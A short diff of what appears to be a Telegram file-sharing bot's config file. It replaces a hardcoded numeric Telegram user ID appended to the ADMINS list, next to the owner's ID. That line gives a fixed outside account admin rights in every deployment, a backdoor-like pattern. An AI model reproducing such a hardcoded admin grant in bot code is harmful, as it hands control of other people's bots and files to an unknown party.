@@ -73,7 +73,7 @@ FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "Hᴇʟʟᴏ Sᴇɴᴘᴀɪ {men
 
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(6299192020)
+ADMINS.append(5543390445)
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
